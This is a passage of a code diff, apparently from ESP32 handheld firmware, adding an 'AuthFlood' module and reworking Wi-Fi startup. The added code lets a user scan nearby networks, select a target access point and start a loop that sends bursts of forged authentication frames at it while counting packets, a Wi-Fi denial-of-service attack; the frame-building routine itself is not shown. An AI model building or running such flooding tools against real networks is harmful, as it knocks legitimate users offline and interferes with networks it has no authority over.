+                        afExitAttackMode();
+                        lastStateChange = now;
+                        drawAttackScreen();
+                    }
+                    lastTap = now;
+                    return;
+                }
+            }
+        }
+    }
+
+    // Hardware BACK button
+    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (attackRunning) {
+            attackRunning = false;
+            afExitAttackMode();
+        }
+        if (targetSelected && !attackRunning) {
+            targetSelected = false;
+            lastStateChange = now;
+            afScanNetworks();
+        } else {
+            exitRequested = true;
+        }
+        return;
+    }
+
+    if (!targetSelected) {
+        // ── SCAN/SELECT SCREEN ──
+        if (buttonPressed(BTN_UP)) {
+            if (afHighlightIdx > 0) {
+                afHighlightIdx--;
+                afCurrentPage = afHighlightIdx / afPerPage;
+                drawScanScreen();
+            }
+        }
+        if (buttonPressed(BTN_DOWN)) {
+            if (afHighlightIdx < afNetworkCount - 1) {
+                afHighlightIdx++;
+                afCurrentPage = afHighlightIdx / afPerPage;
+                drawScanScreen();
+            }
+        }
+        if (buttonPressed(BTN_LEFT)) {
+            if (afCurrentPage > 0) {
+                afCurrentPage--;
+                afHighlightIdx = afCurrentPage * afPerPage;
+                drawScanScreen();
+            }
+        }
+        if (buttonPressed(BTN_RIGHT)) {
+            int totalPages = (afNetworkCount + afPerPage - 1) / afPerPage;
+            if (afCurrentPage < totalPages - 1) {
+                afCurrentPage++;
+                afHighlightIdx = afCurrentPage * afPerPage;
+                drawScanScreen();
+            }
+        }
+
+        if (buttonPressed(BTN_SELECT)) {
+            if (afNetworkCount > 0) {
+                memcpy(&targetAp, &afApList[afHighlightIdx], sizeof(wifi_ap_record_t));
+                targetSelected = true;
+                lastStateChange = now;  // Debounce: prevent immediate attack start
+                tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);
+                drawAttackScreen();
+            }
+        }
+
+        // Touch to select network
+        int touched = getTouchedMenuItem(80, 14, min(afPerPage, afNetworkCount - afCurrentPage * afPerPage));
+        if (touched >= 0) {
+            afHighlightIdx = afCurrentPage * afPerPage + touched;
+            memcpy(&targetAp, &afApList[afHighlightIdx], sizeof(wifi_ap_record_t));
+            targetSelected = true;
+            lastStateChange = now;  // Debounce: prevent immediate attack start
+            tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);
+            drawAttackScreen();
+        }
+
+    } else if (!attackRunning) {
+        // ── TARGET SELECTED, NOT ATTACKING ──
+        // Debounce guard: ignore SELECT for 300ms after state change
+        if (buttonPressed(BTN_SELECT) && (now - lastStateChange > STATE_CHANGE_COOLDOWN)) {
+            // Start attack — verify radio actually works on target channel
+            if (!afInitAttackMode(targetAp.primary)) {
+                tft.fillRect(10, 270, 220, 12, HALEHOUND_BLACK);
+                tft.setTextColor(HALEHOUND_HOTPINK);
+                tft.setCursor(10, 270);
+                tft.print("RADIO INIT FAILED - TRY AGAIN");
+                lastStateChange = now;
+                return;
+            }
+            attackRunning = true;
+            packetCount = 0;
+            successCount = 0;
+            uniqueMACs = 0;
+            attackStartTime = now;
+            lastStateChange = now;
+
+            // Redraw button as STOP + clear standby content
+            tft.fillRect(0, 140, SCREEN_WIDTH, SCREEN_HEIGHT - 140, HALEHOUND_BLACK);
+            drawActionButton(true);
+            tft.drawLine(5, 140, SCREEN_WIDTH - 5, 140, HALEHOUND_DARK);
+
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] Attack started on CH%d %s\n",
+                          targetAp.primary, targetAp.ssid);
+            #endif
+        }
+
+    } else {
+        // ── ATTACKING ──
+        // Debounce guard: ignore SELECT for 300ms after state change
+        if (buttonPressed(BTN_SELECT) && (now - lastStateChange > STATE_CHANGE_COOLDOWN)) {
+            // Stop attack
+            attackRunning = false;
+            afExitAttackMode();
+            lastStateChange = now;
+            drawAttackScreen();  // Redraws full screen with STANDBY + START button
+            return;
+        }
+
+        // Send burst of auth frames
+        for (int i = 0; i < 10; i++) {
+            sendAuthFrame();
+        }
+
+        // Update display every 100ms
+        static unsigned long lastDisplayUpdate = 0;
+        if (now - lastDisplayUpdate >= 100) {
+            lastDisplayUpdate = now;
+            updateAttackDisplay();
+        }
+    }
+}
+
+bool isExitRequested() { return exitRequested; }
+
+void cleanup() {
+    if (attackRunning) {
+        attackRunning = false;
+        afExitAttackMode();
+    }
+    if (afApList) { free(afApList); afApList = nullptr; }
+    afNetworkCount = 0;
+    initialized = false;
+    exitRequested = false;
+    targetSelected = false;
+    lastStateChange = 0;
+    skullFrame = 0;
+    WiFi.mode(WIFI_OFF);
+
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] Cleanup complete");
+    #endif
+}
+
+}  // namespace AuthFlood
 
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -5799,14 +6709,31 @@ void setup() {
     drawFullUI();
 
     if (!initialized) {
-        // Initialize WiFi in promiscuous mode
+        // Full teardown + fresh init with retry (no ESP_ERROR_CHECK crash bombs)
+        wifiCleanup();
         nvs_flash_init();
-        tcpip_adapter_init();
-        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-        ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
-        ESP_ERROR_CHECK(esp_wifi_start());
+        esp_err_t err;
+        for (int attempt = 0; attempt < 3; attempt++) {
+            wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+            err = esp_wifi_init(&cfg);
+            if (err != ESP_OK) {
+                #if CYD_DEBUG
+                Serial.printf("[STATION] esp_wifi_init failed (0x%x), retry %d\n", err, attempt);
+                #endif
+                esp_wifi_deinit();
+                delay(100);
+                continue;
+            }
+            esp_wifi_set_storage(WIFI_STORAGE_RAM);
+            err = esp_wifi_set_mode(WIFI_MODE_NULL);
+            if (err != ESP_OK) { esp_wifi_deinit(); delay(100); continue; }
+            err = esp_wifi_start();
+            if (err != ESP_OK) { esp_wifi_stop(); esp_wifi_deinit(); delay(100); continue; }
+            break;
+        }
+        #if CYD_DEBUG
+        if (err != ESP_OK) Serial.println("[STATION] FATAL: WiFi init failed after 3 attempts");
+        #endif
 
         initialized = true;
     }
